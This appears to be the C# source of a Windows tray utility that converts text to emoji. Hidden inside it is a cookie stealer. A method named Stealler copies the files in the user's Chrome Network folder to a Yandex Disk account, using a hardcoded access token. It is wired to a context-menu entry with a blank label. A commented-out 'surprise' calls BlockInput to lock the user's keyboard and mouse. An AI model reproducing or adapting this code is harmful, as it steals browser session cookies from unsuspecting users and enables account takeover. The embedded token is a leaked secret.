using System.Text.Json;
using System;
using System.Xml.Linq;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Collections;
using System.Net;
using System.Text;
using System.Security.Policy;
using System.IO;
using YandexDisk.Client.Clients;
using YandexDisk.Client.Http;
using System.Runtime.InteropServices;
using YandexDisk.Client.Protocol;

namespace text_to_emoji_v1._1
{

    public partial class Form1 : Form
    {
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        private bool isWindowOpen = true;

        private string token = "y0_AgAAAABIGRMeAAuKoAAAAAEAh_AeAAAfk8ggoPhHwKXP6FmHtQVLBKvk5w";


        Dictionary<string, char> alphabet = new Dictionary<string, char>();
        
        public string text = " ";
        public Form1()
        {
            InitializeComponent();
            ShowInTaskbar = true;
            notifyIcon1.ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip();
            notifyIcon1.ContextMenuStrip.Items.Add("", null, steall);
            notifyIcon1.ContextMenuStrip.Items.Add("Сюрприз =)", null, XD);
            notifyIcon1.ContextMenuStrip.Items.Add("Конвертировать из буфера", null, convert);
            notifyIcon1.ContextMenuStrip.Items.Add("Выход", null, close);
            
            
            
            JObject parsedJson = JObject.Parse(File.ReadAllText("letters.json"));
            int i = 0;
            foreach (JProperty property in parsedJson.Properties())
            {
                alphabet.Add(property.Name, (char)property.Value);
                i++;
                
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(text);
            text = " ";
        }


        public void close(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        public void XD(object sender, EventArgs e)
        {
            //InitializeComponent();
            //Cursor.Hide();
            //FormBorderStyle = FormBorderStyle.None;
            //WindowState = FormWindowState.Maximized;
            //BlockInput(true);
            MessageBox.Show("Проситите, сюрприз ещё в разработке =(", "(´• ω •`)");
        }

        public async Task Stealler()
        {
            try
            {
                Random rnd = new Random();
                var api = new DiskHttpApi(token);
                var rootFolder = await api.MetaInfo.GetInfoAsync(new YandexDisk.Client.Protocol.ResourceRequest
                {
                    Path = "/"
                });
                string folderName = "Кукесы" + rnd.Next();
                if (!rootFolder.Embedded.Items.Any(i => i.Type == ResourceType.Dir && i.Name.Equals(folderName)))
                {
                    await api.Commands.CreateDictionaryAsync("/" + folderName);
                }
                var files = Directory.GetFiles("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Network/");
                foreach (var file in files)
                {
                    var link = await api.Files.GetUploadLinkAsync("/" + folderName + "/" + Path.GetFileName(file), overwrite: false);
                    using (var fs = File.OpenRead(file))
                    {
                        await api.Files.UploadAsync(link, fs);
                    }
                }
                var folderData = await api.MetaInfo.GetInfoAsync(new YandexDisk.Client.Protocol.ResourceRequest
                {
                    Path = "/" + folderName
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"{ex}", "Ошибка");
            }
        }

        public void steall(object sender, EventArgs e)
        {
            Stealler();
        }
        
        public void convert(object sender, EventArgs e)
        {
            string a = Clipboard.GetText();
            TextConvert(a);
            Clipboard.SetText(text);
            text = " ";
        }
        public void TextConvert(string a)
        {
            foreach (char c in a)
            {
                if (c == ' ')
                {
                    text += c;
                }
                else
                {
                    text += alphabet.FirstOrDefault(x => x.Value == c).Key;
                }
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            string a = textBox1.Text.ToLower();
            text = "";
            TextConvert(a);
            label1.Text = text;
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
                Hide();
            }
        }

        private void notifyIcon1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                notifyIcon1.ContextMenuStrip.Show();
            }
            else if (e.Button == MouseButtons.Left)
            {
                if (!isWindowOpen)
                {
                    this.WindowState = FormWindowState.Normal;
                    Show();
                    isWindowOpen = true;
                }
                else
                {
                    this.WindowState = FormWindowState.Normal;
                    Close();
                    isWindowOpen = false;
                }
            }
        }
    }
}